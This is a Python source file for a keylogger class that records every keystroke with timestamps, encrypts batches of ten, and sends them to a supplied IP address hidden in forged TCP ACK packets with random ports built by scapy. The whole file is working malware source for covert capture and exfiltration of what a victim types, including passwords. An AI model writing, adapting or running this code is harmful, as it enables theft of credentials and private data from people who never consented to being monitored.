import time
from scapy.all import *
from pynput.keyboard import Listener
from scapy.layers.inet import TCP, IP
from scapy.layers.l2 import Ether


class Keylogger:
    def __init__(self, ip, key):
        self.isActive = False
        self.keys = []
        self.encryption = key
        self.ip = ip
        self.listener = None
        self.max_length = 10

    def start(self, signal):
        if self.isActive:
            return
        self.isActive = True
        self.listener = Listener(on_press=self.__on_press)
        self.listener.start()
        while self.isActive:
            if signal.value == 0:
                self.isActive = False
            time.sleep(1)
        self.listener.stop()
        self.stop()

    def stop(self):
        self.__sendpkt()
        self.isActive = False

    def flush(self):
        self.keys = []

    def __sendpkt(self):
        if not self.keys:
            return
        data = self.__join_list()
        self.flush()
        data = self.encryption.encrypt(data.encode())
        pkt = self.__forgePacket(data)
        sendp(pkt, verbose=0)

    def __on_press(self, key):
        try:
            self.keys.append([self.__get_time(), format(key)])
            if len(self.keys) >= self.max_length:
                self.__sendpkt()

        except AttributeError as error:
            print(error)
            self.keys.append([self.__get_time(), format(key)])
            print("Special key {0} pressed".format(key))

    def __forgePacket(self, data):
        pkt = Ether() / IP(dst=self.ip) / TCP(sport=RandNum(10000, 19999), dport=RandNum(50000, 59999), flags='A') / Raw(load=data)
        return pkt
    #
    # def __write_to_file(self):
    #     with open(".log.txt", "w") as file:
    #         for key in self.keys:
    #             file.write(f"{key[0]} {key[1]}\n")
    #         print("Done")

    def __get_time(self):
        return time.strftime("%Y-%m-%d: %H:%M:%S ", time.localtime())

    def __join_list(self):
        delimiter = "\n"
        result = ""
        for line in self.keys:
            result = result + line[0] + line[1] + delimiter
        return result
